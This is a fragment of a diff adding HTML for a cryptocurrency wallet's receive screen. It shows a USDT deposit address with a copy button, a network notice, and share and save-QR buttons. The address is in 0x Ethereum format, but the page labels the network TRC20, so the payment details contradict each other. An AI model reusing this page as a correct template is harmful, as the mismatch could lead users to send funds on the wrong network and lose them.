+                        <code class="monospace">0xC20c3DBA48D8EFECb07242e683FB95a7c13bBE31</code>
+                        <button class="copy-btn" onclick="copyToClipboard('0xC20c3DBA48D8EFECb07242e683FB95a7c13bBE31')">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                    <div class="network-info">
+                        <p><i class="fas fa-network-wired"></i> <strong>Network:</strong> TRC20 (Recommended for lower fees)</p>
+                        <p><i class="fas fa-info-circle"></i> Send only USDT to this address. Sending other assets may result in permanent loss.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="receive-actions">
+                <button class="share-btn">
+                    <i class="fas fa-share-alt"></i> Share Address
+                </button>
+                <button class="save-btn">
+                    <i class="fas fa-save"></i> Save QR Code
+                </button>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
